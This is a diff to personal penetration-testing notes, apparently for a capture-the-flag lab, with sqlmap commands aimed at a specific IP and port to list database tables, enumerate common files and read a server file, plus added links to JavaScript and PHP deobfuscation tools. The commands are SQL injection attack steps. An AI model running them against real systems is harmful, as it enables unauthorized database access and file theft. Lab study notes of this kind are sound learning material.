@@ -16,10 +16,10 @@
     sqlmap -u http://138.68.182.108:31930/portfolio.php?id=1
 
 #### list tables
-    sqlmap -u http://138.68.182.108:31930/portfolio.php?id=1 --tables                                                
+    sqlmap -u http://138.68.182.108:31930/portfolio.php?id=1 --tables
 
 #### file structure, e.g. apache
-    sqlmap -u http://138.68.182.108:31930/portfolio.php?id=1 --common-files 
+    sqlmap -u http://138.68.182.108:31930/portfolio.php?id=1 --common-files
 
 #### read file
     sqlmap -u http://138.68.182.108:31930/portfolio.php?id=1 --read-files=/var/www/html/mail/contact_me.php
@@ -30,5 +30,10 @@
 
 ## Deobfuscation
 
+### js
+
 [ JStillery ]( https://en.kali.tools/?p=1354 )
 
+### php
+
+https://www.unphp.net/
